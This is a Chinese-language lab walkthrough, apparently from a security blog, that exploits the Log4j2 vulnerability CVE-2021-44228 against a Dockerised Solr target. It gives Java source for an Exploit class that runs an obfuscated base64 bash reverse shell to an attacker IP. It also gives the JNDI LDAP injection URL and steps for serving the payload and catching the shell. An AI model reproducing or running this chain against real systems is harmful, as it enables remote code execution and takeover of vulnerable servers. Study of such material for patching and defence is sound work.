#  Log4j2-CVE-2021-44228   
Black  天启互联网实验室   2023-12-26 19:54  
  
一、环境搭建  
> 机器：kali Linux  
> Java：jdk8  
> python：python3.7.x  
  
  
二、在docker里面搭建靶机环境  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2BsTqN5XN6yE1laaVA1fpCUMQ46XM7LOMLcs2TftKLv9icwHjyPFbW2NA/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2BIfAyicXB6AicBn7wJYntGbQtIeSKHSLRlGYrAgVF89s3OWCic9XsUta5w/640?wx_fmt=jpeg&from=appmsg "")  
  
三、访问  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2B2LSJ9qFeeIsNWFax8ENAI9ZjHiaccxrFBGek9zsic6eb4vJf2bRyz3eQ/640?wx_fmt=jpeg&from=appmsg "")  
  
四、构造payload  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2BR46ceLH47KYdVsAvCohvcO6j1dJZ3x8q0nS9HV2saePeKEQjdjxiaPQ/640?wx_fmt=jpeg&from=appmsg "")  
  
五、替换  
  
将上面构造好的反弹shell语句替换  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2BNRRNrxQja4M1GmkDVW0yaU54b0MqOomCwlJ9F7UJkcLFVibdjvXpTYw/640?wx_fmt=png&from=appmsg "")  
> import java.lang.Runtime;import java.lang.Process;public class Exploit {     public Exploit(){             try{                
 Runtime.getRuntime().exec("bash -c 
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxNy4xMjgvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}");                                }catch(Exception e){                                            e.printStackTrace();                                             }                }         public static void main(String[] argv){                         Exploit e = new Exploit();                            }}  
  
  
将上面文件放进Exploit.java文件，在Windows用javac进行编译成Exploit.class,记得切换成 jdk8！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2BWLt9YUQEQS4lRRT1GEBic3iao8JoviaKse04dSHp3HCNicWEVdkWpYRGRQ/640?wx_fmt=jpeg&from=appmsg "")  
  
然后放进kali里面查看  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2BeDVq9RdLGElvibMg0SpDVdCoC4eqtgxfc4sXL4FDlKJia2sbauMrBNSg/640?wx_fmt=jpeg&from=appmsg "")  
  
六、开启恶意站点  
  
用python在含有java.class开启http服务  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2BB8Lgv6NCrIjMu7mGsVfic2mRaUxicdO4MOCrwn9SCRcHIaWegwayWJWA/640?wx_fmt=jpeg&from=appmsg "")  
  
访问一下，看看效果  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2B5cficu9gMnFGywfAnhOLXys76jRLbicicHQNeKL6ibfyeJRy2hDQIxAibkA/640?wx_fmt=jpeg&from=appmsg "")  
  
七、用marshalsec-0.0.3-SNAPSHOT-all.jar插件开启LADP监听  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2BfxOBq0msLHIde3tA7RU40QtlFFjuEhh45cexAmBicy7jKej0Tla53hA/640?wx_fmt=jpeg&from=appmsg "")  
  
八、开启监听端口  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2BmHHbQ2eBfUMtgia9CXWKzxKNiaK9wlwzpJWxyAuGBP30MlrruWaXaN1w/640?wx_fmt=jpeg&from=appmsg "")  
  
九、传入恶意参数  
  
http://127.0.0.1:8983/solr/admin/cores?action=${jndi:ldap://192.168.217.128:1389/Exploit}  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2BFXicfPoQ3eGvN0MKKUFlMGPMAjsIkYqibiaIIxXQZGaeia8s3xxZPtsJ3g/640?wx_fmt=jpeg&from=appmsg "")  
  
十、查看效果   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/XpEvyXAhfbhdp4qmeuaeSl9XZ6icBht2B9vibUfopSRrkfdCrgLY2icMjDrdsWuM4u1ERoeMklJmfIl9gIY9k0w3Q/640?wx_fmt=jpeg&from=appmsg "")  
  
如上图所示即反弹shell成功！  
  
  
